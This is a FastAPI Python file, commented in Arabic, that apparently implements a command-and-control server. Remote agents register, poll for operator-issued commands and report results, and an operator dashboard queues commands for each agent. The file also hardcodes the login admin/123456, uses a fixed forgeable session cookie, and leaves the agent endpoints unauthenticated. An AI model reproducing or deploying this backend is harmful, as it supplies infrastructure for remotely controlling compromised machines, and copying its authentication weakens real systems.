from fastapi import FastAPI, Request, Form, status
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from typing import Dict

app = FastAPI()

# إعداد القوالب
templates = Jinja2Templates(directory="templates")

# بيانات الدخول (غيّرها لاحقًا)
ADMIN_USER = "admin"
ADMIN_PASS = "123456"

# تخزين مؤقت (في الإنتاج استعمل DB)
agents: Dict[str, dict] = {}
commands: Dict[str, str] = {}

# تحقق من تسجيل الدخول
def is_logged_in(request: Request) -> bool:
    return request.cookies.get("session") == "active"


# ======================
# Dashboard
# ======================
@app.get("/", response_class=HTMLResponse)
async def dashboard(request: Request):
    if not is_logged_in(request):
        return templates.TemplateResponse(
            "login.html",
            {"request": request}
        )

    return templates.TemplateResponse(
        "index.html",
        {
            "request": request,
            "agents": agents
        }
    )


# ======================
# Auth
# ======================
@app.post("/login")
async def login(
    username: str = Form(...),
    password: str = Form(...)
):
    if username == ADMIN_USER and password == ADMIN_PASS:
        resp = RedirectResponse(
            url="/",
            status_code=status.HTTP_303_SEE_OTHER
        )
        resp.set_cookie(
            key="session",
            value="active",
            httponly=True
        )
        return resp

    return HTMLResponse("Access Denied", status_code=401)


@app.get("/logout")
async def logout():
    resp = RedirectResponse(url="/")
    resp.delete_cookie("session")
    return resp


# ======================
# Agent API
# ======================
@app.post("/register")
async def register_agent(data: dict):
    agent_id = data.get("agent_id")
    if not agent_id:
        return {"error": "agent_id required"}

    agents[agent_id] = data
    return {"status": "registered"}


@app.post("/poll")
async def poll_agent(data: dict):
    agent_id = data.get("agent_id")
    if not agent_id:
        return {"error": "agent_id required"}

    # تحديث آخر حالة
    if agent_id in agents and data.get("result"):
        agents[agent_id]["last_result"] = data["result"]

    # إرسال أمر إن وجد
    cmd = commands.pop(agent_id, None)
    if cmd:
        return {"command": cmd}

    return {"status": "idle"}


# ======================
# Send Command
# ======================
@app.post("/send_command")
async def send_command(
    request: Request,
    agent_id: str = Form(...),
    command: str = Form(...)
):
    if not is_logged_in(request):
        return RedirectResponse("/", status_code=303)

    commands[agent_id] = command
    return RedirectResponse("/", status_code=303)
